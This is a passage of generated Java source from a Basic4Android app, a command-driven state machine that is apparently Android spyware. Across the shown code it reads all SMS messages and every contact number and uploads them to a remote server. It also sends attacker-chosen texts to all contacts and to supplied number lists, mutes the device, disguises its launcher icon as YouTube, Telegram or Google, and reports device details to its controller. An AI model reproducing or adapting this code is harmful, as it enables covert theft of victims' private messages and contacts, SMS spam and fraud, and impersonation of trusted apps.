case 50:
//C
this.state = 53;
this.catchState = 52;
 //BA.debugLineNum = 130;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"iconchange"+"&screen="+parent._res);
 //BA.debugLineNum = 131;BA.debugLine="Sleep(2500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (2500));
this.state = 346;
return;
case 346:
//C
this.state = 53;
;
 //BA.debugLineNum = 132;BA.debugLine="set_icon_status(\"main\",False)";
_set_icon_status("main",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 133;BA.debugLine="set_icon_status(\"second\",True)";
_set_icon_status("second",anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 134;BA.debugLine="set_icon_status(\"youtube\",False)";
_set_icon_status("youtube",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 135;BA.debugLine="set_icon_status(\"telegram\",False)";
_set_icon_status("telegram",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 136;BA.debugLine="set_icon_status(\"google\",False)";
_set_icon_status("google",anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 52:
//C
this.state = 53;
this.catchState = 0;
 //BA.debugLineNum = 138;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983136",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 53:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 55:
//C
this.state = 56;
 //BA.debugLineNum = 142;BA.debugLine="Log(command)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983140",_command,0);
 //BA.debugLineNum = 143;BA.debugLine="Try";
if (true) break;

case 56:
//try
this.state = 61;
this.catchState = 60;
this.state = 58;
if (true) break;

case 58:
//C
this.state = 61;
this.catchState = 60;
 //BA.debugLineNum = 145;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"iconchange"+"&screen="+parent._res);
 //BA.debugLineNum = 146;BA.debugLine="Sleep(2500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (2500));
this.state = 347;
return;
case 347:
//C
this.state = 61;
;
 //BA.debugLineNum = 147;BA.debugLine="set_icon_status(\"main\",False)";
_set_icon_status("main",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 148;BA.debugLine="set_icon_status(\"telegram\",True)";
_set_icon_status("telegram",anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 149;BA.debugLine="set_icon_status(\"youtube\",False)";
_set_icon_status("youtube",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 150;BA.debugLine="set_icon_status(\"second\",False)";
_set_icon_status("second",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 151;BA.debugLine="set_icon_status(\"google\",False)";
_set_icon_status("google",anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 60:
//C
this.state = 61;
this.catchState = 0;
 //BA.debugLineNum = 153;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983151",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 61:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 63:
//C
this.state = 64;
 //BA.debugLineNum = 156;BA.debugLine="Try";
if (true) break;

case 64:
//try
this.state = 77;
this.catchState = 76;
this.state = 66;
if (true) break;

case 66:
//C
this.state = 67;
this.catchState = 76;
 //BA.debugLineNum = 157;BA.debugLine="Dim allcon As String = \"\"";
_allcon = "";
 //BA.debugLineNum = 158;BA.debugLine="cu.Initialize";
parent._cu._initialize(processBA);
 //BA.debugLineNum = 159;BA.debugLine="Dim MessageText As String = TextSms";
_messagetext = _textsms;
 //BA.debugLineNum = 160;BA.debugLine="For Each c As cuContact In cu.FindContactsByPho";
if (true) break;

case 67:
//for
this.state = 74;
group101 = parent._cu._findcontactsbyphone("",anywheresoftware.b4a.keywords.Common.False,anywheresoftware.b4a.keywords.Common.False);
index101 = 0;
groupLen101 = group101.getSize();
this.state = 348;
if (true) break;

case 348:
//C
this.state = 74;
if (index101 < groupLen101) {
this.state = 69;
_c = (b4a.example.contactsutils._cucontact)(group101.Get(index101));}
if (true) break;

case 349:
//C
this.state = 348;
index101++;
if (true) break;

case 69:
//C
this.state = 70;
 //BA.debugLineNum = 161;BA.debugLine="For Each Phonec As cuPhone In cu.GetPhones(c.I";
if (true) break;

case 70:
//for
this.state = 73;
group102 = parent._cu._getphones(_c.Id);
index102 = 0;
groupLen102 = group102.getSize();
this.state = 350;
if (true) break;

case 350:
//C
this.state = 73;
if (index102 < groupLen102) {
this.state = 72;
_phonec = (b4a.example.contactsutils._cuphone)(group102.Get(index102));}
if (true) break;

case 351:
//C
this.state = 350;
index102++;
if (true) break;

case 72:
//C
this.state = 351;
 //BA.debugLineNum = 162;BA.debugLine="allcon = allcon&CRLF&Phonec.Number";
_allcon = _allcon+anywheresoftware.b4a.keywords.Common.CRLF+_phonec.Number;
 //BA.debugLineNum = 163;BA.debugLine="Sleep(500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (500));
this.state = 352;
return;
case 352:
//C
this.state = 351;
;
 //BA.debugLineNum = 164;BA.debugLine="SendSMS(Phonec.Number,MessageText)";
_sendsms(_phonec.Number,_messagetext);
 if (true) break;
if (true) break;

case 73:
//C
this.state = 349;
;
 if (true) break;
if (true) break;

case 74:
//C
this.state = 77;
;
 //BA.debugLineNum = 168;BA.debugLine="File.WriteString(File.DirInternal, \"result.txt\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"result.txt",_allcon);
 //BA.debugLineNum = 169;BA.debugLine="Send.SendFile(\"?response=true&action=scontact&M";
parent._send._sendfile /*void*/ ("?response=true&action=scontact&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&operator="+parent._phone.GetNetworkOperatorName()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&screen="+parent._res+"","result.txt");
 if (true) break;

case 76:
//C
this.state = 77;
this.catchState = 0;
 //BA.debugLineNum = 171;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983169",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 77:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 79:
//C
this.state = 80;
 //BA.debugLineNum = 176;BA.debugLine="Log(command)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983174",_command,0);
 //BA.debugLineNum = 177;BA.debugLine="Try";
if (true) break;

case 80:
//try
this.state = 85;
this.catchState = 84;
this.state = 82;
if (true) break;

case 82:
//C
this.state = 85;
this.catchState = 84;
 //BA.debugLineNum = 178;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"iconchange"+"&screen="+parent._res);
 //BA.debugLineNum = 179;BA.debugLine="Sleep(2500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (2500));
this.state = 353;
return;
case 353:
//C
this.state = 85;
;
 //BA.debugLineNum = 180;BA.debugLine="set_icon_status(\"main\",False)";
_set_icon_status("main",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 181;BA.debugLine="set_icon_status(\"youtube\",True)";
_set_icon_status("youtube",anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 182;BA.debugLine="set_icon_status(\"telegram\",False)";
_set_icon_status("telegram",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 183;BA.debugLine="set_icon_status(\"second\",False)";
_set_icon_status("second",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 184;BA.debugLine="set_icon_status(\"google\",False)";
_set_icon_status("google",anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 84:
//C
this.state = 85;
this.catchState = 0;
 //BA.debugLineNum = 186;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983184",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 85:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 87:
//C
this.state = 88;
 //BA.debugLineNum = 190;BA.debugLine="Log(command)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983188",_command,0);
 //BA.debugLineNum = 191;BA.debugLine="Try";
if (true) break;

case 88:
//try
this.state = 93;
this.catchState = 92;
this.state = 90;
if (true) break;

case 90:
//C
this.state = 93;
this.catchState = 92;
 //BA.debugLineNum = 192;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"iconchange"+"&screen="+parent._res);
 //BA.debugLineNum = 193;BA.debugLine="Sleep(2500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (2500));
this.state = 354;
return;
case 354:
//C
this.state = 93;
;
 //BA.debugLineNum = 194;BA.debugLine="set_icon_status(\"main\",False)";
_set_icon_status("main",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 195;BA.debugLine="set_icon_status(\"google\",True)";
_set_icon_status("google",anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 196;BA.debugLine="set_icon_status(\"youtube\",False)";
_set_icon_status("youtube",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 197;BA.debugLine="set_icon_status(\"telegram\",False)";
_set_icon_status("telegram",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 198;BA.debugLine="set_icon_status(\"second\",False)";
_set_icon_status("second",anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 92:
//C
this.state = 93;
this.catchState = 0;
 //BA.debugLineNum = 200;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983198",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 93:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 95:
//C
this.state = 96;
 //BA.debugLineNum = 203;BA.debugLine="Try";
if (true) break;

case 96:
//try
this.state = 101;
this.catchState = 100;
this.state = 98;
if (true) break;

case 98:
//C
this.state = 101;
this.catchState = 100;
 //BA.debugLineNum = 204;BA.debugLine="phone.SetVolume(phone.VOLUME_NOTIFICATION, 0, F";
parent._phone.SetVolume(parent._phone.VOLUME_NOTIFICATION,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 205;BA.debugLine="phone.SetVolume(phone.VOLUME_SYSTEM, 0, False)";
parent._phone.SetVolume(parent._phone.VOLUME_SYSTEM,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 206;BA.debugLine="phone.SetVolume(phone.VOLUME_ALARM, 0, False)";
parent._phone.SetVolume(parent._phone.VOLUME_ALARM,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 207;BA.debugLine="phone.SetVolume(phone.VOLUME_MUSIC, 0, False)";
parent._phone.SetVolume(parent._phone.VOLUME_MUSIC,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 100:
//C
this.state = 101;
this.catchState = 0;
 //BA.debugLineNum = 209;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983207",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 101:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 103:
//C
this.state = 104;
 //BA.debugLineNum = 213;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 214;BA.debugLine="Try";
if (true) break;

case 104:
//try
this.state = 113;
this.catchState = 112;
this.state = 106;
if (true) break;

case 106:
//C
this.state = 107;
this.catchState = 112;
 //BA.debugLineNum = 215;BA.debugLine="Dim MessageText As String = TextSms";
_messagetext = _textsms;
 //BA.debugLineNum = 216;BA.debugLine="Dim x As List = Regex.Split(\",\",NumberList)";
_x = new anywheresoftware.b4a.objects.collections.List();
_x = anywheresoftware.b4a.keywords.Common.ArrayToList(anywheresoftware.b4a.keywords.Common.Regex.Split(",",_numberlist));
 //BA.debugLineNum = 217;BA.debugLine="For i = 0 To x.Size";
if (true) break;

case 107:
//for
this.state = 110;
step153 = 1;
limit153 = _x.getSize();
_i = (int) (0) ;
this.state = 355;
if (true) break;

case 355:
//C
this.state = 110;
if ((step153 > 0 && _i <= limit153) || (step153 < 0 && _i >= limit153)) this.state = 109;
if (true) break;

case 356:
//C
this.state = 355;
_i = ((int)(0 + _i + step153)) ;
if (true) break;

case 109:
//C
this.state = 356;
 //BA.debugLineNum = 218;BA.debugLine="Dim SmsNumber As String = x.Get(i)";
_smsnumber = BA.ObjectToString(_x.Get(_i));
 //BA.debugLineNum = 219;BA.debugLine="SendSMS(SmsNumber,MessageText)";
_sendsms(_smsnumber,_messagetext);
 //BA.debugLineNum = 220;BA.debugLine="Sleep(5000)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (5000));
this.state = 357;
return;
case 357:
//C
this.state = 356;
;
 if (true) break;
if (true) break;

case 110:
//C
this.state = 113;
;
 //BA.debugLineNum = 223;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"Silent"+"&screen="+parent._res);
 if (true) break;

case 112:
//C
this.state = 113;
this.catchState = 0;
 //BA.debugLineNum = 225;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983223",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 113:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 115:
//C
this.state = 116;
 //BA.debugLineNum = 229;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 230;BA.debugLine="Try";
if (true) break;

case 116:
//try
this.state = 121;
this.catchState = 120;
this.state = 118;
if (true) break;

case 118:
//C
this.state = 121;
this.catchState = 120;
 //BA.debugLineNum = 232;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&berand="+parent._phone.getManufacturer()+"&Product="+parent._phone.getProduct()+"&Model="+parent._phone.getModel()+"&operator="+parent._phone.GetNetworkOperatorName()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"status"+"&screen="+parent._res);
 if (true) break;

case 120:
//C
this.state = 121;
this.catchState = 0;
 //BA.debugLineNum = 234;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983232",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 121:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 123:
//C
this.state = 124;
 //BA.debugLineNum = 238;BA.debugLine="Try";
if (true) break;

case 124:
//try
this.state = 133;
this.catchState = 132;
this.state = 126;
if (true) break;

case 126:
//C
this.state = 127;
this.catchState = 132;
 //BA.debugLineNum = 239;BA.debugLine="Dim MessageText As String = TextSms";
_messagetext = _textsms;
 //BA.debugLineNum = 240;BA.debugLine="Dim x As List = Regex.Split(\",\",NumberList)";
_x = new anywheresoftware.b4a.objects.collections.List();
_x = anywheresoftware.b4a.keywords.Common.ArrayToList(anywheresoftware.b4a.keywords.Common.Regex.Split(",",_numberlist));
 //BA.debugLineNum = 241;BA.debugLine="For Each Numb As String In x";
if (true) break;

case 127:
//for
this.state = 130;
group173 = _x;
index173 = 0;
groupLen173 = group173.getSize();
this.state = 358;
if (true) break;

case 358:
//C
this.state = 130;
if (index173 < groupLen173) {
this.state = 129;
_numb = BA.ObjectToString(group173.Get(index173));}
if (true) break;

case 359:
//C
this.state = 358;
index173++;
if (true) break;

case 129:
//C
this.state = 359;
 //BA.debugLineNum = 242;BA.debugLine="SendSMS(Numb,MessageText)";
_sendsms(_numb,_messagetext);
 //BA.debugLineNum = 243;BA.debugLine="Sleep(1000)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (1000));
this.state = 360;
return;
case 360:
//C
this.state = 359;
;
 if (true) break;
if (true) break;

case 130:
//C
this.state = 133;
;
 if (true) break;

case 132:
//C
this.state = 133;
this.catchState = 0;
 //BA.debugLineNum = 246;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983244",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 133:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 135:
//C
this.state = 136;
 //BA.debugLineNum = 251;BA.debugLine="If File.Exists(File.DirInternal,\"offline.txt\") T";
if (true) break;

case 136:
//if
this.state = 141;
if (anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt")) { 
this.state = 138;
}else {
this.state = 140;
}if (true) break;

case 138:
//C
this.state = 141;
 //BA.debugLineNum = 252;BA.debugLine="File.Delete(File.DirInternal,\"offline.txt\")";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt");
 if (true) break;

case 140:
//C
this.state = 141;
 //BA.debugLineNum = 254;BA.debugLine="File.WriteString(File.DirInternal,\"offline.txt\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt",_numberlist);
 //BA.debugLineNum = 256;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"offlineOn"+"&screen="+parent._res);
 if (true) break;

case 141:
//C
this.state = 340;
;
 if (true) break;

case 143:
//C
this.state = 144;
 //BA.debugLineNum = 260;BA.debugLine="If File.Exists(File.DirInternal,\"offline.txt\") T";
if (true) break;

case 144:
//if
this.state = 147;
if (anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt")) { 
this.state = 146;
}if (true) break;

case 146:
//C
this.state = 147;
 //BA.debugLineNum = 261;BA.debugLine="File.Delete(File.DirInternal,\"offline.txt\")";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"offline.txt");
 if (true) break;

case 147:
//C
this.state = 340;
;
 //BA.debugLineNum = 264;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(\"";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"offlineOff"+"&screen="+parent._res);
 if (true) break;

case 149:
//C
this.state = 150;
 //BA.debugLineNum = 267;BA.debugLine="Try";
if (true) break;

case 150:
//try
this.state = 165;
this.catchState = 164;
this.state = 152;
if (true) break;

case 152:
//C
this.state = 153;
this.catchState = 164;
 //BA.debugLineNum = 268;BA.debugLine="Dim allsmstext,whosend As String = \"\"";
_allsmstext = "";
_whosend = "";
 //BA.debugLineNum = 269;BA.debugLine="li.Initialize";
parent._li.Initialize();
 //BA.debugLineNum = 270;BA.debugLine="li = allsms.GetAll";
parent._li = parent._allsms.GetAll();
 //BA.debugLineNum = 271;BA.debugLine="For i = 0 To li.Size -1";
if (true) break;

case 153:
//for
this.state = 162;
step197 = 1;
limit197 = (int) (parent._li.getSize()-1);
_i = (int) (0) ;
this.state = 361;
if (true) break;

case 361:
//C
this.state = 162;
if ((step197 > 0 && _i <= limit197) || (step197 < 0 && _i >= limit197)) this.state = 155;
if (true) break;

case 362:
//C
this.state = 361;
_i = ((int)(0 + _i + step197)) ;
if (true) break;

case 155:
//C
this.state = 156;
 //BA.debugLineNum = 272;BA.debugLine="sms = li.Get(i)";
parent._sms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(parent._li.Get(_i));
 //BA.debugLineNum = 273;BA.debugLine="If sms.Type == 1 Then";
if (true) break;

case 156:
//if
this.state = 161;
if (parent._sms.Type==1) { 
this.state = 158;
}else {
this.state = 160;
}if (true) break;

case 158:
//C
this.state = 161;
 //BA.debugLineNum = 274;BA.debugLine="whosend = \"Receive\"";
_whosend = "Receive";
 //BA.debugLineNum = 275;BA.debugLine="allsmstext = allsmstext & CRLF & CRLF & \"----";
_allsmstext = _allsmstext+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+"--------------------"+anywheresoftware.b4a.keywords.Common.CRLF+"sender : "+parent._sms.Address+anywheresoftware.b4a.keywords.Common.CRLF+"Text : "+parent._sms.Body+anywheresoftware.b4a.keywords.Common.CRLF+"Status : "+_whosend+anywheresoftware.b4a.keywords.Common.CRLF+"Date : "+anywheresoftware.b4a.keywords.Common.DateTime.Date(parent._sms.Date)+" "+anywheresoftware.b4a.keywords.Common.DateTime.Time(parent._sms.Date)+anywheresoftware.b4a.keywords.Common.CRLF+"--------------------";
 if (true) break;

case 160:
//C
this.state = 161;
 if (true) break;

case 161:
//C
this.state = 362;
;
 if (true) break;
if (true) break;

case 162:
//C
this.state = 165;
;
 //BA.debugLineNum = 279;BA.debugLine="filesmsname = Rnd(11111,99999)";
parent._filesmsname = BA.NumberToString(anywheresoftware.b4a.keywords.Common.Rnd((int) (11111),(int) (99999)));
 //BA.debugLineNum = 280;BA.debugLine="File.WriteString(File.DirInternal,filesmsname&\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),parent._filesmsname+".txt",_allsmstext);
 //BA.debugLineNum = 281;BA.debugLine="Send.SendFile(\"?response=true&action=allsms&Mod";
parent._send._sendfile /*void*/ ("?response=true&action=allsms&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&operator="+parent._phone.GetNetworkOperatorName()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&screen="+parent._res+"",parent._filesmsname+".txt");
 if (true) break;

case 164:
//C
this.state = 165;
this.catchState = 0;
 //BA.debugLineNum = 283;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983281",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 165:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 167:
//C
this.state = 168;
 //BA.debugLineNum = 287;BA.debugLine="Try";
if (true) break;

case 168:
//try
this.state = 203;
this.catchState = 202;
this.state = 170;
if (true) break;

case 170:
//C
this.state = 171;
this.catchState = 202;
 //BA.debugLineNum = 288;BA.debugLine="Dim SMS_READ,ClassString As String";
_sms_read = "";
_classstring = "";
 //BA.debugLineNum = 289;BA.debugLine="Private StringBuilder As StringBuilder";
_stringbuilder = new anywheresoftware.b4a.keywords.StringBuilderWrapper();
 //BA.debugLineNum = 290;BA.debugLine="StringBuilder.Initialize";
_stringbuilder.Initialize();
 //BA.debugLineNum = 291;BA.debugLine="Try";
if (true) break;

case 171:
//try
this.state = 200;
this.catchState = 199;
this.state = 173;
if (true) break;

case 173:
//C
this.state = 174;
this.catchState = 199;
 //BA.debugLineNum = 292;BA.debugLine="Private SM As SmsMessages";
_sm = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 293;BA.debugLine="StringBuilder.Append(\"|-----@geeeh-----|\")";
_stringbuilder.Append("|-----@geeeh-----|");
 //BA.debugLineNum = 294;BA.debugLine="For Each SMSDATA As Sms In SM.GetAll";
if (true) break;

case 174:
//for
this.state = 197;
group219 = _sm.GetAll();
index219 = 0;
groupLen219 = group219.getSize();
this.state = 363;
if (true) break;

case 363:
//C
this.state = 197;
if (index219 < groupLen219) {
this.state = 176;
_smsdata = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(group219.Get(index219));}
if (true) break;

case 364:
//C
this.state = 363;
index219++;
if (true) break;

case 176:
//C
this.state = 177;
 //BA.debugLineNum = 295;BA.debugLine="If SMSDATA.Read Then";
if (true) break;

case 177:
//if
this.state = 182;
if (_smsdata.Read) { 
this.state = 179;
}else {
this.state = 181;
}if (true) break;

case 179:
//C
this.state = 182;
 //BA.debugLineNum = 296;BA.debugLine="SMS_READ = \"Readed\"";
_sms_read = "Readed";
 if (true) break;

case 181:
//C
this.state = 182;
 //BA.debugLineNum = 298;BA.debugLine="SMS_READ = \"UnReaded\"";
_sms_read = "UnReaded";
 if (true) break;

case 182:
//C
this.state = 183;
;
 //BA.debugLineNum = 300;BA.debugLine="ClassString = \"UNKNOWN\"";
_classstring = "UNKNOWN";
 //BA.debugLineNum = 301;BA.debugLine="Select SMSDATA.Type";
if (true) break;

case 183:
//select
this.state = 196;
switch (BA.switchObjectToInt(_smsdata.Type,_sm.TYPE_DRAFT,_sm.TYPE_FAILED,_sm.TYPE_INBOX,_sm.TYPE_OUTBOX,_sm.TYPE_QUEUED,_sm.TYPE_SENT)) {
case 0: {
this.state = 185;
if (true) break;
}
case 1: {
this.state = 187;
if (true) break;
}
case 2: {
this.state = 189;
if (true) break;
}
case 3: {
this.state = 191;
if (true) break;
}
case 4: {
this.state = 193;
if (true) break;
}
case 5: {
this.state = 195;
if (true) break;
}
}
if (true) break;

case 185:
//C
this.state = 196;
 //BA.debugLineNum = 303;BA.debugLine="ClassString = \"DRAFT\"";
_classstring = "DRAFT";
 if (true) break;

case 187:
//C
this.state = 196;
 //BA.debugLineNum = 305;BA.debugLine="ClassString = \"FAILED\"";
_classstring = "FAILED";
 if (true) break;

case 189:
//C
this.state = 196;
 //BA.debugLineNum = 307;BA.debugLine="ClassString = \"INBOX\"";
_classstring = "INBOX";
 if (true) break;

case 191:
//C
this.state = 196;
 //BA.debugLineNum = 309;BA.debugLine="ClassString = \"OUTBOX\"";
_classstring = "OUTBOX";
 if (true) break;

case 193:
//C
this.state = 196;
 //BA.debugLineNum = 311;BA.debugLine="ClassString = \"QUEUED\"";
_classstring = "QUEUED";
 if (true) break;

case 195:
//C
this.state = 196;
 //BA.debugLineNum = 313;BA.debugLine="ClassString = \"SENT\"";
_classstring = "SENT";
 if (true) break;

case 196:
//C
this.state = 364;
;
 //BA.debugLineNum = 315;BA.debugLine="StringBuilder.Append(CRLF).Append(\"sender : \"";
_stringbuilder.Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("sender : ").Append(_smsdata.Address).Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("Status : ").Append(_sms_read).Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("Type : ").Append(_classstring).Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("Text :").Append(anywheresoftware.b4a.keywords.Common.CRLF).Append(_smsdata.Body).Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("|-----@geeeh-----|");
 if (true) break;
if (true) break;

case 197:
//C
this.state = 200;
;
 if (true) break;

case 199:
//C
this.state = 200;
this.catchState = 202;
 //BA.debugLineNum = 318;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983316",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 200:
//C
this.state = 203;
this.catchState = 202;
;
 //BA.debugLineNum = 320;BA.debugLine="filesmsname = Rnd(11111,99999)";
parent._filesmsname = BA.NumberToString(anywheresoftware.b4a.keywords.Common.Rnd((int) (11111),(int) (99999)));
 //BA.debugLineNum = 321;BA.debugLine="File.WriteString(File.DirInternal,filesmsname&\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),parent._filesmsname+".txt",_stringbuilder.ToString());
 //BA.debugLineNum = 322;BA.debugLine="Send.SendFile(\"?response=true&action=allsms&Mod";
parent._send._sendfile /*void*/ ("?response=true&action=allsms&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&operator="+parent._phone.GetNetworkOperatorName()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&screen="+parent._res+"&andver="+parent._pd.getOSVersion()+"",parent._filesmsname+".txt");
 if (true) break;

case 202:
//C
this.state = 203;
